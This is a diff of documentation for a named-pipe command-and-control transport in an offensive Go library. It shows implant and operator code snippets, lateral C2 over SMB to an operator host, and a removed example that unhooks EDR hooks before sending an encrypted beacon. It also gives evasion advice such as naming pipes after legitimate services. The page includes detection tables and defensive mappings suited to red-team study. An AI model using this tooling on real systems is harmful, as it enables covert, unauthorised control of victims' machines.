@@ -1,242 +1,216 @@
-# Named Pipe Transport
+---
+package: github.com/oioio-space/maldev/c2/transport/namedpipe
+last_reviewed: 2026-04-27
+reflects_commit: 36484a4
+---
 
-| Field | Value |
-|-------|-------|
-| MITRE ATT&CK | T1071.001 Application Layer Protocol |
-| Package | `c2/transport/namedpipe` |
-| Platform | Windows |
-| Detection | Medium |
+# Named-pipe transport
+
+[← c2 index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Windows named-pipe implementation of the
+[`c2/transport`](transport.md) `Transport` and `Listener` interfaces.
+Lets implants beacon over **local IPC** (no socket, no firewall, no
+NIDS visibility) or over **SMB** to another host (lateral C2 routed
+through the file-share redirector). Pipe traffic is the textbook
+example of "looks like normal Windows".
 
 ## Primer
 
-Most C2 traffic leaves the host over TCP or HTTP, which firewalls and network sensors inspect closely. Windows named pipes are an on-host IPC channel that Windows services use constantly, so traffic between two local processes over a pipe looks identical to normal OS activity.
+Most C2 traffic leaves the host over TCP / HTTP, where firewalls and
+NIDS inspect every packet. Windows named pipes are an on-host IPC
+channel that the OS uses constantly — SMB, RPC, the print spooler,
+LSASS, every COM out-of-process server. Two processes communicating
+over a pipe leave **zero** network artefacts; cross-host pipes (over
+the SMB redirector) leave SMB session-auditing entries that look
+identical to legitimate file-share use.
 
-An implant can beacon to a local relay (or to another session over SMB) through a named pipe without ever touching a network socket that a perimeter IDS can see.
+The package implements both sides:
 
-## What It Does
+- `Listener` (`namedpipe.NewListener(name)`) — server-side, accepts
+  agents on `\\.\pipe\<name>`.
+- `Transport` (`namedpipe.New(name, timeout)`) — client-side,
+  connects to either `\\.\pipe\<name>` (local) or
+  `\\<host>\pipe\<name>` (cross-host SMB).
 
-Provides a C2 transport over Windows named pipes, implementing both client (`transport.Transport`) and server (`transport.Listener`) interfaces. Named pipes are a native IPC mechanism used extensively by Windows services, making pipe-based C2 traffic blend with legitimate OS activity.
+Either side plugs into the rest of the C2 stack:
+[`c2/shell`](reverse-shell.md) takes a `Transport`,
+[`c2/multicat`](multicat.md) takes a `Listener`.
 
-## How It Works
+## How it works
 
 ```mermaid
 sequenceDiagram
-    participant Server as namedpipe.PipeListener
-    participant NP as Named Pipe (\\.\pipe\c2agent)
-    participant Client as namedpipe.Pipe
+    participant Server as namedpipe.Listener
+    participant NP as \\.\pipe\c2agent
+    participant Client as namedpipe.Transport (implant)
 
-    Server->>NP: CreateNamedPipeW (duplex, byte mode)
-    Server->>NP: ConnectNamedPipe (blocks)
-
-    Client->>NP: WaitNamedPipeW (timeout)
-    Client->>NP: CreateFile(GENERIC_READ|GENERIC_WRITE)
-    NP-->>Server: ERROR_PIPE_CONNECTED (race) / signalled
-    NP-->>Client: handle wrapped as pipeConn
-
-    Note over Server,Client: Both endpoints now hold a net.Conn.<br/>Traffic stays on the local SMB/IPC subsystem —<br/>never touches the network stack, TCP, or HTTP.
-
-    Client->>NP: Write(beacon)
-    NP->>Server: Accept returns pipeConn
-    Server->>NP: Read → dispatch
-    Server->>NP: Write(response)
-    NP->>Client: Read
+    Server->>NP: CreateNamedPipe (instance 1)
+    Server->>NP: ConnectNamedPipe (block)
+    Client->>NP: CreateFile(\\.\pipe\c2agent)
+    NP-->>Server: client connected
+    Server->>Server: spawn next instance (CreateNamedPipe)
+    Server->>Server: ConnectNamedPipe (block)
+    par bidirectional I/O
+        Client->>NP: WriteFile (stdin)
+        NP-->>Server: ReadFile
+        Server->>NP: WriteFile (stdout)
+        NP-->>Client: ReadFile
+    end
 ```
 
-### Server Flow
-
-1. `NewListener(name)` validates the pipe name and returns a `PipeListener`.
-2. `Accept(ctx)` calls `CreateNamedPipeW` to create a duplex, byte-mode pipe instance (up to 255 concurrent instances, 64 KB buffers).
-3. `ConnectNamedPipe` blocks until a client connects. `ERROR_PIPE_CONNECTED` is handled for the race where a client connects between create and wait.
-4. The connected handle is wrapped in a `pipeConn` implementing `net.Conn`.
-
-### Client Flow
-
-1. `New(name, timeout)` stores the pipe name and dial timeout.
-2. `Connect(ctx)` calls `WaitNamedPipeW` with the configured timeout, then opens the pipe with `CreateFile` (`GENERIC_READ|GENERIC_WRITE`).
-3. The handle is wrapped in a `pipeConn` for read/write.
-
-## API
-
-```go
-// Client
-func New(name string, timeout time.Duration) *Pipe
-func (p *Pipe) Connect(ctx context.Context) error
-func (p *Pipe) Read(buf []byte) (int, error)
-func (p *Pipe) Write(buf []byte) (int, error)
-func (p *Pipe) Close() error
-func (p *Pipe) RemoteAddr() net.Addr
-
-// Server
-func NewListener(name string) (*PipeListener, error)
-func (l *PipeListener) Accept(ctx context.Context) (net.Conn, error)
-func (l *PipeListener) Close() error
-func (l *PipeListener) Addr() net.Addr
-```
-
-## Usage
-
-### Standalone
-
-```go
-// Server
-ln, _ := namedpipe.NewListener(`\\.\pipe\c2agent`)
-defer ln.Close()
-conn, _ := ln.Accept(ctx)
-buf := make([]byte, 4096)
-n, _ := conn.Read(buf)
-conn.Write([]byte("ack"))
-
-// Client
-p := namedpipe.New(`\\.\pipe\c2agent`, 5*time.Second)
-p.Connect(ctx)
-defer p.Close()
-p.Write([]byte("beacon"))
-```
-
-### Advanced — concurrent server with cancellation
-
-One `PipeListener` can accept up to 255 concurrent pipe instances. The common
-pattern is a `for`-loop that calls `Accept` and hands each `net.Conn` to a
-dedicated goroutine, with the top-level `context.Context` plumbed through so
-`Close()` on the listener cleanly unblocks everything.
-
-```go
-package main
-
-import (
-    "context"
-    "io"
-    "log"
-    "net"
-    "os/signal"
-    "syscall"
-
-    "github.com/oioio-space/maldev/c2/transport/namedpipe"
-)
-
-func handle(conn net.Conn) {
-    defer conn.Close()
-    // Echo framing example — real C2 would dispatch a command.
-    io.Copy(conn, conn)
-}
-
-func main() {
-    ctx, stop := signal.NotifyContext(context.Background(),
-        syscall.SIGINT, syscall.SIGTERM)
-    defer stop()
-
-    ln, err := namedpipe.NewListener(`\\.\pipe\c2agent`)
-    if err != nil {
-        log.Fatal(err)
-    }
-    // Closing the listener on shutdown unblocks the outstanding Accept.
-    go func() { <-ctx.Done(); ln.Close() }()
-
-    for {
-        conn, err := ln.Accept(ctx)
-        if err != nil {
-            if ctx.Err() != nil {
-                return // clean shutdown
-            }
-            log.Printf("accept: %v", err)
-            continue
-        }
-        go handle(conn)
-    }
-}
-```
-
-### With multicat
-
-```go
-cfg := multicat.Config{
-    Transports: []transport.Transport{
-        namedpipe.New(`\\.\pipe\c2local`, 5*time.Second),
-        transport.NewTCP("10.0.0.1:4444", 10*time.Second),
-    },
-}
-mc := multicat.New(cfg)
-mc.Connect(ctx)
-```
-
----
-
-## Combined Example
-
-Beacon over a named pipe with an AES-GCM-encrypted payload, after patching
-ntdll to remove vendor hooks that would otherwise log the pipe syscalls.
-
-```go
-package main
-
-import (
-    "context"
-    "time"
-
-    "github.com/oioio-space/maldev/c2/transport/namedpipe"
-    "github.com/oioio-space/maldev/crypto"
-    "github.com/oioio-space/maldev/evasion/unhook"
-)
-
-func main() {
-    ctx := context.Background()
-
-    // 1. Remove EDR inline hooks on common ntdll exports first. Any later
-    //    call into NtCreateFile / NtWriteFile for the pipe transport will
-    //    reach the real kernel stub instead of the vendor detour.
-    for _, t := range unhook.CommonClassic() {
-        _ = t.Apply(nil)
-    }
-
-    // 2. Dial the local pipe. To a network sensor this is invisible — no
-    //    packets leave the host; to a process-tree view it's just IPC.
-    p := namedpipe.New(`\\.\pipe\spoolv4`, 5*time.Second)
-    if err := p.Connect(ctx); err != nil {
-        return
-    }
-    defer p.Close()
-
-    // 3. Encrypt the beacon with AES-GCM so a defender who tees the pipe
-    //    (debugger, minifilter, Sysmon pipe-content rule) sees ciphertext.
-    key, _ := crypto.NewAESKey()
-    beacon := []byte(`{"id":"agent-01","cmd":"checkin"}`)
-    ct, _ := crypto.EncryptAESGCM(key, beacon)
-    _, _ = p.Write(ct)
-
-    // Response side (mirror): p.Read → crypto.DecryptAESGCM(key, buf[:n]).
-}
-```
-
-Layered benefit: unhooking restores clean syscall stubs so nothing in the
-pipe I/O path feeds a vendor sensor; the named-pipe transport keeps traffic
-on-host and looks like ordinary IPC; AES-GCM turns any captured pipe bytes
-into opaque, integrity-protected ciphertext.
-
----
-
-## MITRE ATT&CK
-
-| Tactic | Technique | ID |
-|--------|-----------|----|
-| Command and Control | Application Layer Protocol | T1071.001 |
-| Execution | Inter-Process Communication | T1559 |
-| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
-
-## Detection
-
-| Signal | Detail |
-|--------|--------|
-| Named pipe creation | Sysmon Event ID 17/18 logs pipe creation and connection |
-| Pipe name pattern | Non-standard pipe names outside known Windows services |
-| SMB traffic | Named pipe access over SMB (port 445) for lateral movement |
-| Handle inspection | Process handle enumeration reveals open pipe handles |
-
-**Rating: Medium** -- Named pipes are heavily used by legitimate Windows services, making detection reliant on pipe name heuristics and behavioral analysis rather than simple signature matching.
-
----
+Each `Accept` returns a connected pipe instance; the listener
+immediately spawns the next instance so subsequent clients do not
+block.
 
 ## API Reference
 
-The full surface is inlined in [§ API](#api) above. See also
-[c2.md](../../c2.md#c2transportnamedpipe----windows-named-pipe-transport)
-for the package summary row.
+### `namedpipe.NewListener(name string) (*Listener, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport/namedpipe#NewListener)
+
+Server-side. `name` is the full pipe path
+(`\\.\pipe\c2agent`).
+
+### `(*Listener).Accept(ctx context.Context) (net.Conn, error)`
+
+Block until an agent connects. Returns a `net.Conn` whose `Read` /
+`Write` traverse the pipe.
+
+### `namedpipe.New(addr string, timeout time.Duration) *NamedPipe`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport/namedpipe#New)
+
+Client-side. `addr` is `\\.\pipe\<name>` (local) or
+`\\<host>\pipe\<name>` (SMB). `timeout` applies to `Connect` only.
+
+### `(*NamedPipe).Connect(ctx context.Context) error`
+
+Open the pipe.
+
+### Standard Transport methods
+
+`Read`, `Write`, `Close`, `RemoteAddr` follow `c2/transport.Transport`.
+
+## Examples
+
+### Simple (local IPC)
+
+Server (operator's relay tool on the same host):
+
+```go
+ln, _ := namedpipe.NewListener(`\\.\pipe\c2agent`)
+conn, _ := ln.Accept(context.Background())
+```
+
+Implant:
+
+```go
+p := namedpipe.New(`\\.\pipe\c2agent`, 5*time.Second)
+_ = p.Connect(context.Background())
+_, _ = p.Write([]byte("hello"))
+```
+
+### Composed (lateral SMB pipe)
+
+Server on `OPERATOR-HOST`:
+
+```go
+ln, _ := namedpipe.NewListener(`\\.\pipe\lat-c2`)
+```
+
+Agent on a different domain-joined host (with credentials to reach
+the share):
+
+```go
+p := namedpipe.New(`\\OPERATOR-HOST\pipe\lat-c2`, 30*time.Second)
+_ = p.Connect(context.Background())
+```
+
+The Windows SMB redirector tunnels the pipe over `tcp/445`. To NIDS
+this looks like an SMB session; a typical defender focused on web /
+TLS traffic does not parse SMB content.
+
+### Advanced (named-pipe shell + multicat)
+
+Operator side combines `multicat` with the pipe listener:
+
+```go
+import (
+    "context"
+
+    "github.com/oioio-space/maldev/c2/multicat"
+    "github.com/oioio-space/maldev/c2/transport"
+    "github.com/oioio-space/maldev/c2/transport/namedpipe"
+)
+
+ln, _ := namedpipe.NewListener(`\\.\pipe\c2agent`)
+adapter := transport.WrapNetListener(ln) // expose as transport.Listener
+mgr := multicat.New()
+go mgr.Listen(context.Background(), adapter)
+```
+
+Implant uses the same pipe transport on the agent side via
+`c2/shell.New`.
+
+### Complex (pipe + named-pipe ACL hardening)
+
+Production pipe servers need an explicit `SecurityDescriptor` so
+unprivileged code on the same host cannot connect. The package's
+default DACL allows `Everyone` for ease of testing — overwrite it
+before exposing across hosts. Refer to
+[`c2/transport/namedpipe/listener_windows.go`](../../../c2/transport/namedpipe/listener_windows.go)
+for the exact `SECURITY_ATTRIBUTES` shape.
+
+See `ExampleNewListener` in
+[`namedpipe_example_test.go`](../../../c2/transport/namedpipe/namedpipe_example_test.go).
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| Pipe `\\.\pipe\<custom-name>` opened by an unusual process | Sysmon Event 17/18 (PipeCreated / PipeConnected) — most defenders are not subscribed by default |
+| Pipe name not matching common services (`spoolss`, `lsass`, `wkssvc`, `srvsvc`, …) | Hunt rules — pick a name that mimics a legitimate service to blend |
+| Cross-host SMB session to `\\target\pipe\<name>` | Windows Security Event 5145 (file-share access) when audit policy is set |
+| Pipe acting as full-duplex shell I/O channel | Behavioural EDR rules (rare; the high signal is the pipe + child process pairing) |
+
+**D3FEND counters:**
+
+- [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/)
+  — SMB-traffic profiling.
+- [D3-OTF](https://d3fend.mitre.org/technique/d3f:OutboundTrafficFiltering/)
+  — egress filter blocking outbound `tcp/445` outside expected
+  fileservers.
+
+**Hardening for the operator:** name the pipe to mimic a legitimate
+service (e.g. `\\.\pipe\spoolss-<rand>`); set a strict DACL that
+only the implant's user can connect to; lateral SMB pipes assume
+`tcp/445` is open between hosts — verify before relying on the
+technique.
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | pipe over SMB lateral path | D3-NTA |
+| [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | Remote Services: SMB/Windows Admin Shares | when bound across hosts via SMB redirector | D3-NTA |
+
+## Limitations
+
+- **Windows-only.** No Unix-domain-socket fallback in this package.
+- **DACL defaults are permissive.** Override `SECURITY_ATTRIBUTES`
+  on the listener before exposing across users.
+- **SMB pipe needs `tcp/445` connectivity** between hosts; many
+  segmented networks deny it.
+- **Bidirectional only.** No half-duplex / shared-channel mode.
+
+## See also
+
+- [Transport](transport.md) — generic interface.
+- [Reverse shell](reverse-shell.md) — primary consumer over local
+  pipes.
+- [Multicat](multicat.md) — operator-side accept loop.
+- [Microsoft, *Named Pipes Overview*](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
+  — primer.
